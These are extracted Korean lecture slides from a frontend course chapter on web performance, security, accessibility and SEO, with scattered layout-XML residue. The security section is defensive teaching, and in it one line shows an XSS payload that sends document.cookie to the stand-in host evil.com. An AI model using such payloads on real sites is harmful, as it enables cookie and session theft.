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8장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성능·보안·접근성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빠르게, 안전하게, 모두가 쓸 수 있게 — 완성도의 세 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페이지가 느려지는 원인을 진단하고 개선 방향을 고를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XSS 등 프론트엔드에서 실제로 일어나는 보안 문제를 설명하고 막을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 4원칙을 알고 HTML·CSS 수준에서 지킬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검색엔진이 페이지를 이해하는 데 필요한 것을 갖출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완성 전 점검 절차를 스스로 실행할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7144" y="2781300"/>
            <a:ext cx="65747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7144" y="2781300"/>
            <a:ext cx="65747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LCP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19872" y="2781300"/>
            <a:ext cx="66471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9872" y="2781300"/>
            <a:ext cx="66471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9836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9836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지연 로딩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14469" y="2781300"/>
            <a:ext cx="67434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4469" y="2781300"/>
            <a:ext cx="67434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XSS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84059" y="2781300"/>
            <a:ext cx="94940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4059" y="2781300"/>
            <a:ext cx="94940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HTTPS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8717" y="2781300"/>
            <a:ext cx="83274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8717" y="2781300"/>
            <a:ext cx="83274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API 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56714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6714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접근성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1955" y="2781300"/>
            <a:ext cx="83500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1955" y="2781300"/>
            <a:ext cx="83500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POUR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2211" y="2781300"/>
            <a:ext cx="67987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2211" y="2781300"/>
            <a:ext cx="67987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SEO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성능 — 왜 빠른 것이 중요한가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느린 페이지는 읽히기 전에 닫힙니다.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성능 — 왜 빠른 것이 중요한가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로딩이 1초에서 3초로 늘면 이탈률이 크게 오른다는 조사가 반복해서 나옵니다.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성능은 취향이 아니라 사용자가 내용을 볼 수 있느냐의 문제입니다.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성능 — 왜 빠른 것이 중요한가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148233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14823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29333" y="2781300"/>
            <a:ext cx="4406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29333" y="2781300"/>
            <a:ext cx="4406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재는가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774333" y="2781300"/>
            <a:ext cx="237066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774333" y="2781300"/>
            <a:ext cx="237066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914823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89577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LCP (Largest Contentful Paint)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29333" y="3448050"/>
            <a:ext cx="4406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583" y="3448050"/>
            <a:ext cx="4216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큰 요소가 그려지기까지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774333" y="3448050"/>
            <a:ext cx="237066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69583" y="3448050"/>
            <a:ext cx="218016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2.5초 이내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914823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89577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INP (Interaction to Next Paint)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29333" y="4171950"/>
            <a:ext cx="4406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583" y="4171950"/>
            <a:ext cx="4216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눌렀을 때 반응하기까지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774333" y="4171950"/>
            <a:ext cx="237066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69583" y="4171950"/>
            <a:ext cx="218016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200ms 이내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914823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89577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CLS (Cumulative Layout Shift)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29333" y="4895850"/>
            <a:ext cx="4406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583" y="4895850"/>
            <a:ext cx="4216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화면이 얼마나 덜컹거렸는가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774333" y="4895850"/>
            <a:ext cx="237066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69583" y="4895850"/>
            <a:ext cx="218016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0.1 이내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순서대로 하세요 — 앞의 것이 훨씬 효과가 큽니다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이미지를 줄인다.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대부분의 페이지에서 용량의 절반 이상이 이미지입니다. 필요한 크기로 리사이즈하고, WebP를 쓰고, srcset으로 화면에 맞는 것을 내려보냅니다.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안 쓰는 것을 지운다.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유틸리티 클래스 몇 개 때문에 CSS 프레임워크 전체를 불러오지 않습니다. 라이브러리 하나가 페이지 전체보다 무거운 경우가 흔합니다.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나중에 필요한 것은 나중에 불러온다.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 밖 이미지는 loading="lazy", 당장 필요 없는 스크립트는 defer.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자주 쓰는 것들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화면 밖 이미지는 나중에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"photo.jpg"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"설명"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loading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"lazy"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"800"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"600"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스크립트: HTML 파싱을 막지 않게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"app.js"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defer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순서 보장, DOM 완성 후 실행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"ad.js"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async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순서 무관, 받는 대로 실행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폰트: 로딩 중에도 글자가 보이게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&lt;link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"...&amp;display=swap"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"stylesheet"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곧 쓸 도메인에 미리 연결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&lt;link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"preconnect"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"https://fonts.gstatic.com"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crossorigin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자리를 미리 잡아 두기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 ① 이미지에 크기 지정 — 로드 전에도 자리를 차지한다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"a.jpg"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"800"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"600"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 ② 또는 CSS에서 비율 고정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.thumb { aspect-ratio: 16 / 9; object-fit: cover;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 ③ 늦게 채워지는 영역에 최소 높이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.ad-slot { min-height: 250px;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 ④ 웹폰트 교체 시 글자가 튀지 않게 — 대체 글꼴을 비슷한 것으로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font-family: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'Noto Sans KR'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'Malgun Gothic'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sans-serif;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읽던 글이 갑자기 아래로 밀리는 경험은 성능 지표에서 큰 감점 요인이자, 사용자에게 가장 짜증나는 경험 중 하나입니다.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1.2 레이아웃 이동(CLS) 막기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성능 개선은 먼저 재고 나서 고칩니다.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개발자도구의 Lighthouse와 Network 탭이 무엇이 무거운지 정확히 알려 줍니다.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추측으로 최적화하면 효과 없는 곳에 시간을 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보안 — 프론트엔드에서 실제로 일어나는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가장 중요한 전제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프론트엔드 코드는 전부 공개된 것입니다.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브라우저에 내려간 순간 누구나 소스보기·개발자도구로 읽을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JS로 숨긴 것은 숨긴 것이 아닙니다.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개발자도구로 버튼을 되살려 누르면 그만입니다.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그러므로 중요한 판단은 반드시 서버에서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합니다. 프론트의 검증과 숨김은 편의일 뿐 보안이 아닙니다.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XSS (Cross-Site Scripting)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남이 쓴 글에 든 스크립트가 내 페이지에서 실행되는 공격입니다.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프론트엔드에서 가장 자주, 가장 쉽게 만들어지는 취약점입니다.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어떻게 일어나는가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사용자가 게시글에 이렇게 씁니다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 input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'&lt;img src=x onerror="fetch(\'http://evil.com/?c=\'+document.cookie)"&gt;'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el.innerHTML = input;    // ❌ onerror가 실행되어 쿠키가 공격자에게 넘어갑니다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 ⚠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"&lt;script&gt;만 막으면 되겠지"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는 통하지 않습니다.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innerHTML로 넣은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는 실행되지 않지만,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onerror·onload·onmouseover 같은 이벤트 속성은 실행됩니다.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XSS를 막는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사용자 입력은 textContent 로 넣습니다.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하나로 대부분이 막힙니다.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HTML을 꼭 허용해야 한다면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검증된 정화 라이브러리(DOMPurify 등)를 씁니다. 직접 정규식으로 거르려 하지 마세요 — 반드시 뚫립니다.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href 에 사용자 값을 넣을 때 주의.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javascript: 로 시작하는 주소가 들어갈 수 있습니다.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CSP(Content Security Policy) 헤더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 인라인 스크립트 실행을 막을 수 있습니다(서버 설정).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절대 하면 안 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프론트엔드 파일에 API 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API_KEY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'sk-abcd1234...'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`https://api.example.com?key=${API_KEY}`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소스보기로 다 보입니다. GitHub에 올리면 자동 수집 봇이 몇 분 안에 찾아갑니다.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실제로 클라우드 요금 폭탄 사고가 이 경로로 자주 납니다.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 키가 필요한 호출은 서버를 거칩니다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fetch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'/api/search?q='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키는 서버가 갖고 있음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비밀은 코드에 넣지 않습니다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실수로 키를 올렸다면 커밋을 지우는 것만으로는 부족합니다.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 수집됐다고 보고 그 키를 폐기하고 새로 발급해야 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.gitignore 에 .env 를 넣어 두는 것이 예방책입니다.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2.3 그 밖의 기본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75898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75898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40085" y="2781300"/>
            <a:ext cx="1220491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0085" y="2781300"/>
            <a:ext cx="1220491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75898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568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HTTPS를 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40085" y="3448050"/>
            <a:ext cx="122049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5335" y="3448050"/>
            <a:ext cx="120144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HTTP는 오가는 내용이 그대로 보입니다. 카페 와이파이에서 비밀번호가 노출됩니다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375898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568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비밀번호는 해시로 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0085" y="4171950"/>
            <a:ext cx="122049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5335" y="4171950"/>
            <a:ext cx="120144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DB가 털려도 원래 비밀번호를 알 수 없어야 합니다 (서버 쪽 일)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375898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568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rel="noopener"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40085" y="4895850"/>
            <a:ext cx="122049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35335" y="4895850"/>
            <a:ext cx="120144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탭이 원래 페이지를 조작하는 것을 막습니다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375898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568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서버에서 다시 검증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40085" y="5619750"/>
            <a:ext cx="122049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5335" y="5619750"/>
            <a:ext cx="120144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요청은 얼마든지 조작할 수 있습니다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375898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568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의존성을 최신으로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40085" y="6343650"/>
            <a:ext cx="1220491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35335" y="6343650"/>
            <a:ext cx="1201441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옛 라이브러리의 알려진 취약점이 그대로 남습니다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접근성은 장애가 있어도, 나이가 많아도, 마우스가 고장 났어도, 밝은 야외에서도 웹을 쓸 수 있게 만드는 것입니다.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한국에서는 「장애인차별금지법」에 따라 공공기관과 일정 규모 이상 민간 사이트에 준수 의무가 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다섯 가지가 전체의 대부분입니다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&lt;img&gt; 에 의미 있는 alt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장식이면 alt="", 빠뜨리면 파일명이 읽힙니다.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제목 계층(h1→h2→h3)을 건너뛰지 않기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화면낭독기 사용자는 제목으로 이동합니다.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&lt;label&gt; 과 &lt;input&gt; 연결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폼에서 가장 중요합니다.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의미에 맞는 태그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누르는 것은 &lt;button&gt;, 이동하는 것은 &lt;a&gt;.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&lt;html lang="ko"&gt;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언어로 읽을지 정해 줍니다.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색 대비와 초점 표시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절대 이렇게만 쓰지 마세요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focus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outline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키보드 사용자가 위치를 알 수 없게 됩니다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✅ 없앤다면 대체 스타일을 반드시 줍니다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focus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visible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outline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solid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outline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offset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색 대비 — 본문 4.5:1, 큰 글자 3:1 이상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개발자도구에서 색을 클릭하면 대비율을 바로 보여 줍니다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색 대비와 초점 표시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면과 그 위에 얹히는 것에 같은 색 토큰을 쓰지 않습니다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active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background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primary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active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icon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primary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❌ 대비 1:1 — 사라집니다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active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icon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primary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✅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움직임을 줄여 달라는 설정 존중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prefers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reduced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motion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reduce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*, *::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before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*::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after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animation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duration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0.01ms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!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important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transition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duration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0.01ms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!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important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3.2 CSS에서 지켜야 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색만으로 정보를 전달하지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"빨간 항목은 마감"이라고 하면 색각 이상이 있는 사람(남성의 약 8%)은 구분하지 못합니다.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색 + 아이콘, 색 + 글자를 함께 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 규칙: 안 쓰는 것이 제일 좋습니다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❌ 굳이 이렇게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&lt;div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"button"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tabindex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"0"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onclick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"..."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누르기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&lt;/div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✅ 그냥 button을 쓰면 전부 공짜로 얻습니다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누르기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ARIA가 정말 필요한 경우: 네이티브 태그로 표현 못 할 때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aria-expanded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"false"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aria-controls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"menu"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메뉴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&lt;/button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&lt;div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"menu"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hidden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...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&lt;/div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&lt;div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"status"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aria-live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"polite"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3건을 불러왔습니다.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&lt;/div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화면 갱신을 화면낭독기에 알림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3.3 ARIA — 필요할 때만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"ARIA를 잘못 쓰느니 안 쓰는 것이 낫다" 는 것이 접근성 업계의 오래된 원칙입니다.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잘못된 role은 오히려 보조기술을 혼란스럽게 만듭니다.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3.4 직접 해 볼 수 있는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마우스를 치우고 Tab 키만으로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페이지를 끝까지 훑습니다. 어디서 막히나요? 지금 어디에 있는지 눈에 보이나요?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브라우저를 200%로 확대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 봅니다. 글자가 잘리거나 겹치지 않나요?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→ Lighthouse → Accessibility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점수를 재 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흑백으로 보기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개발자도구 Rendering 탭의 색각 이상 시뮬레이션. 색으로만 구분한 곳이 드러납니다.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SEO — 검색엔진이 이해하게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검색엔진의 크롤러도 결국 눈이 없는 사용자입니다.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SEO — 검색엔진이 이해하게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접근성을 잘 지킨 사이트가 SEO도 좋습니다.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두 가지는 같은 방향을 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페이지마다 갖춰야 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&lt;title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구체적인 페이지 제목 — 사이트 이름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&lt;/title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"description"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"이 페이지가 무엇에 관한 것인지 한두 문장. 검색 결과에 그대로 보입니다."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&lt;link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"canonical"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"https://example.com/이-페이지/"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"robots"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"index, follow"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공유 미리보기 (카카오톡·SNS) --&gt;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"og:type"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"website"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"og:title"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"..."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"og:description"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"..."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"og:image"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"https://example.com/og-image.png"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절대 주소 · 1200×630 --&gt;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"og:url"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"https://example.com/"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property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"og:site_name"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"..."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"twitter:card"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"summary_large_image"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SEO의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&lt;title&gt; 과 description 은 페이지마다 다르게.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같으면 검색엔진이 구별하지 못합니다.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h1은 하나, 계층은 건너뛰지 않기.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구조가 곧 중요도 신호입니다.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의미 있는 URL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/page?id=3 보다 /weeks/3 이 낫습니다.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빠른 로딩과 모바일 대응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은 검색 순위에 직접 반영됩니다.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alt 텍스트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 이미지 검색에도 잡힙니다.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완성 전 점검 절차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제출·배포 전에 이 목록을 훑으세요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기능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링크·버튼이 동작하는가. 콘솔에 빨간 오류가 없는가. console.log 를 지웠는가.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360px에서 가로 스크롤이 생기지 않는가. 기기 도구 모음으로 여러 폭을 확인했는가.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접근성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img 에 alt, 모든 input 에 label, Tab만으로 조작 가능, 초점이 보이는가.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성능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이미지가 필요 이상으로 크지 않은가. Lighthouse 점수를 재 봤는가.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제출·배포 전에 이 목록을 훑으세요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메타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title·description·OG 태그가 있는가. 휴대폰에서 링크를 공유해 봤는가.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보안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키·비밀번호가 코드에 없는가. 사용자 입력을 innerHTML 로 넣지 않았는가.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주소에서 열리는가. 파일명 대소문자 문제로 404가 나는 것이 없는가.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8장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완성 전 점검 절차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"고쳤다"는 판정은 되돌려서 확인합니다.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고친 뒤만 재면 원래 안 깨져 있었어도 통과합니다.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고치기 전 상태로 되돌려 재현되는 것을 확인해야 판정이 사실이 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이것은 이 과목뿐 아니라 앞으로 개발을 하는 내내 쓰게 될 원칙입니다.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8장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8장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8장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성능·보안·접근성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13주차 · 15주차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